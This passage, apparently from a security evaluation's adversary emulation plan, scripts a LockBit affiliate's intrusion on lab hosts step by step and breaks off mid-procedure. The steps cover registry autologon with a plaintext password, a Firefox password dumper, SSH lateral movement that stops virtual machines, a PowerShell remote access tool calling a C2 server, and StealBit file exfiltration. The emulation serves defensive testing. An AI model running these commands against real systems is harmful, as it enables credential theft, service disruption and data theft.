<td><a href="https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/" class="outbound" target="_blank"><span>nccgroup</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate executes <code v-pre>cmdkey /list</code></td>
<td>-</td>
<td>T1555 Credentials from Password Stores</td>
<td><a href="https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/" class="outbound" target="_blank"><span>nccgroup</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate executes <code v-pre>net group</code></td>
<td>-</td>
<td>T1069.002 Permission Groups Discovery: Domain Groups</td>
<td><a href="https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/" class="outbound" target="_blank"><span>nccgroup</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate executes <code v-pre>net localgroup</code></td>
<td>-</td>
<td>T1069.001 Permission Groups Discovery: Local Groups</td>
<td><a href="https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/" class="outbound" target="_blank"><span>nccgroup</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate executes PowerShell</td>
<td>-</td>
<td>T1059.001 Command and Scripting Interpreter: PowerShell</td>
<td><a href="https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/" class="outbound" target="_blank"><span>nccgroup</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate enumerates running system services</td>
<td>-</td>
<td>T1007 System Service Discovery</td>
<td><a href="https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/" class="outbound" target="_blank"><span>nccgroup</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-3---persistence-evaluation-step-11">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---persistence-evaluation-step-11">#</doc-anchor-trigger>
        <span>Step 3 - Persistence (Evaluation Step 11)</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>The LockBit affiliate installs persistence on <code v-pre>quirrell (10.111.9.202)</code> by modifying
the <code v-pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>
subkey to enable automatic login.</p>
<doc-anchor-target id="biohazard-procedures-4">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-4">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Within your TightVNC session to <code v-pre>quirrell (10.111.9.202)</code>, search for Registry
Editor and right-click to Run as Administrator.</p>
</li>
<li><p>Browse to <code v-pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>
and add/edit the following:</p>
<ul>
<li>AutoAdminLogin
<ul>
<li>Click Edit &gt; New &gt; String Value (if the value already exists, modify the
existing one)</li>
<li>Type <code v-pre>AutoAdminLogon</code>, press Enter then double click the new key
<code v-pre>AutoAdminLogon</code></li>
<li>In the Edit String dialog, type <code v-pre>1</code> for &quot;Value data&quot; then click OK</li>
</ul>
</li>
<li>DefaultUserName
<ul>
<li>Click Edit &gt; New &gt; String Value (if the value already exists, modify the
existing one)</li>
<li>Type <code v-pre>DefaultUserName</code>, press Enter then double click the new key
<code v-pre>DefaultUserName</code></li>
<li>In the Edit String dialog, type <code v-pre>gornuk</code> for &quot;Value data&quot; then click OK</li>
</ul>
</li>
<li>DefaultPassword
<ul>
<li>Click Edit &gt; New &gt; String Value (if the value already exists, modify the
existing one)</li>
<li>Type <code v-pre>DefaultPassword</code>, press Enter then double click the new key
<code v-pre>DefaultPassword</code></li>
<li>In the Edit String dialog, type <code v-pre>Concave-Monsieur</code> for &quot;Value data&quot; then click
OK</li>
</ul>
</li>
<li>DefaultDomainName
<ul>
<li>Click Edit &gt; New &gt; String Value (if the value already exists, modify the
existing one)</li>
<li>Type <code v-pre>DefaultDomainName</code>, press Enter then double click the new key
<code v-pre>DefaultDomainName</code></li>
<li>In the Edit String dialog, type <code v-pre>decryptmalfoy</code> for &quot;Value data&quot; then
click OK</li>
</ul>
</li>
</ul>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>LockBit affiliate modifies the registry to enable automatic logon</td>
<td>-</td>
<td>T1552.002 Unsecured Credentials: Credentials in Registry</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-4---credential-access-evaluation-step-12">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---credential-access-evaluation-step-12">#</doc-anchor-trigger>
        <span>Step 4 - Credential Access (Evaluation Step 12)</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>The LockBit affiliate ingresses the FireFox password dumper using <code v-pre>chocolatey</code>
then dumps passwords from the FireFox browser, recovering the domain admin
credentials to access the Linux KVM server.</p>
<doc-anchor-target id="noise">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#noise">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50A;</span> Noise</span>
    </h3>
</doc-anchor-target>
<p>The following noise activity is executed:</p>
<ul>
<li>User will manipulate volume shadow copy
<ul>
<li><code v-pre>vssadmin add shadowstorage /for=C: /on=C: /maxsize=UNBOUNDED</code></li>
<li><code v-pre>vssadmin create shadow /for=C:</code></li>
</ul>
</li>
<li>User will execute chocolatey to install profwiz and ldapadmin
<ul>
<li><code v-pre>choco install profwiz -y</code></li>
<li><code v-pre>choco install ldapadmin -y</code></li>
</ul>
</li>
</ul>
<doc-anchor-target id="biohazard-procedures-5">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-5">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Within your TightVNC session to <code v-pre>quirrell (10.111.9.202)</code>, using the elevated
Command Prompt minimized earlier, execute <code v-pre>chocolatey</code> to download the FireFox
password dumper:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-batch"><code v-pre class="language-batch">choco install FoxAdminPro -y</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the FoxAdminPro screenshot.</p>
</li>
<li><p>Within the Command Prompt, execute the FireFox password dumper:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-batch"><code v-pre class="language-batch">FoxAdminPro -d C:\Users\gornuk\AppData\Roaming\Mozilla\Firefox\Profiles\ohbrdd1o.default-release\</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the command output.</p>
</li>
<li><p>Confirm the output contains the domain admin credentials</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>LockBit affiliate uses chocolatey to ingress additional tooling</td>
<td>-</td>
<td>T1072 Software Deployment Tools</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>chocolatey downloads FireFox password dumper</td>
<td>-</td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate executes FireFox password dumper</td>
<td>-</td>
<td>T1555.003 Credentials from Password Stores: Credentials from Web Browsers</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-5---lateral-movement-to-linux-server-evaluation-step-13">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---lateral-movement-to-linux-server-evaluation-step-13">#</doc-anchor-trigger>
        <span>Step 5 - Lateral Movement to Linux Server (Evaluation Step 13)</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>The LockBit affiliate uses the recovered password to SSH to the Linux KVM
server <code v-pre>horcrux (10.111.8.40)</code>. After performing discovery, the LockBit affiliate
performs the following actions:</p>
<ul>
<li>Stop virtual machines</li>
<li>Disable autostart</li>
</ul>
<doc-anchor-target id="biohazard-procedures-6">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-6">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Within the elevated Command Prompt, SSH to the Linux KVM server
<code v-pre>horcrux (10.111.8.40)</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-batch"><code v-pre class="language-batch">ssh gornuk.da@10.111.8.40</code></pre>
</doc-codeblock></div>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>Frown-Cement</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Within the SSH prompt, enumerate virtual machines running:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sudo podman ps -a</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the command output.</p>
</li>
<li><p>Within the SSH prompt, execute the following commands:</p>
<ul>
<li><p>Stop virtual machines</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sudo podman stop -a</code></pre>
</doc-codeblock></div>
</li>
<li><p>Disable autostart</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sudo systemctl disable --now podman
sudo systemctl disable --now podman-restart</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the command output.</p>
</li>
</ul>
</li>
<li><p>Exit the SSH prompt</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">exit</code></pre>
</doc-codeblock></div>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>LockBit affiliate accesses Linux host over SSH</td>
<td>-</td>
<td>T1021.004 Remote Services: SSH</td>
<td>-</td>
</tr>
<tr>
<td>LockBit affiliate enumerates VMs</td>
<td>-</td>
<td>T1057 Process Discovery</td>
<td><a href="https://www.trendmicro.com/en_th/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html" class="outbound" target="_blank"><span>Trend Micro</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate stops VMs and autostart</td>
<td>-</td>
<td>T1489 Service Stop</td>
<td><a href="https://www.trendmicro.com/en_th/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html" class="outbound" target="_blank"><span>Trend Micro</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-6---privilege-escalation-and-command--control-evaluation-step-14">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---privilege-escalation-and-command--control-evaluation-step-14">#</doc-anchor-trigger>
        <span>Step 6 - Privilege Escalation and Command &amp; Control (Evaluation Step 14)</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>The LockBit affiliate ingresses ThunderShell, a PowerShell based remote access
tool, using chocolatey. The LockBit affiliate then opens PowerShell with
administrative privileges and executes ThunderShell.</p>
<p>ThunderShell establishes communications over HTTP to the adversary C2 server.</p>
<doc-anchor-target id="biohazard-procedures-7">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-7">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Within the elevated Command Prompt, execute <code v-pre>chocolatey</code> to download
<code v-pre>ThunderShell</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-batch"><code v-pre class="language-batch">choco install Termini -y</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the installation output.</p>
</li>
<li><p>Search for PowerShell and right-click to Run as Administrator</p>
</li>
<li><p>Paste the following commands into the PowerShell Window and press enter</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">Set-ExecutionPolicy bypass
import-module C:\ProgramData\chocolatey\lib\Termini\tools\termini.ps1</code></pre>
</doc-codeblock></div>
</li>
<li><p>Press [A] or [Y] and press [ENTER] when prompted.</p>
</li>
<li><p>Minimize all windows on <code v-pre>quirrell (10.111.9.202)</code> then minimize the VNC</p>
</li>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Switch to Kali and confirm in the ThunderShell C2 tab the
C2 registration of a new ThunderShell implant</p>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the Thundershell terminal window showing the new session.</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>chocolatey downloads ThunderShell</td>
<td>-</td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>ThunderShell is executed via PowerShell</td>
<td>-</td>
<td>T1059.001 Command and Scripting Interpreter: PowerShell</td>
<td>-</td>
</tr>
<tr>
<td>ThunderShell communicates over HTTP</td>
<td>-</td>
<td>T1071.001 Application Layer Protocol: Web Protocols</td>
<td>-</td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-7---exfiltration-evaluation-step-15">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---exfiltration-evaluation-step-15">#</doc-anchor-trigger>
        <span>Step 7 - Exfiltration (Evaluation Step 15)</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>Leveraging <code v-pre>ThunderShell</code> to remotely access <code v-pre>quirrell (10.99.9.202)</code>, the LockBit
affiliate executes <code v-pre>chocolatey</code> to download <code v-pre>StealBit</code> for file discovery, system
information gathering, and data exfiltration.</p>
<p><code v-pre>StealBit</code> is an exfiltration tool utilizing native APIs and threading to
optimize execution and exfiltration of files. It also performs the following
behaviors:</p>
<ul>
<li>Checks if being debugged and infinitely loops</li>
<li>Recursively enumerates folders and files, avoiding deny-list items</li>
<li>Checks C2 server connectivity using an HTTP GET request</li>
<li>Exfiltrates files using HTTP PUT requests</li>
<li>Deletes itself on completion</li>
</ul>
<doc-anchor-target id="biohazard-procedures-8">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-8">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>In the ThunderShell prompt, enter the following command to interact with the
newly registered shell:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">interact 1</code></pre>
</doc-codeblock></div>
</li>
<li><p>In the shell interaction prompt, enter the following command to download
<code v-pre>StealBit</code> to <code v-pre>quirrell (10.111.9.202)</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">choco install connhost -y</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the connhost install output.</p>
</li>
<li><p>In the shell interaction prompt, enter the following command to execute
<code v-pre>StealBit</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">connhost.exe C:\\Users\\ -d</code></pre>
</doc-codeblock></div>
</li>
<li><p>Switch to the evalsC2server tab and confirm the exfiltrated files were
received successfully. The ThunderShell prompt should print out the following
once StealBit has finished execution:</p>
<div class="codeblock-wrapper"><doc-codeblock>
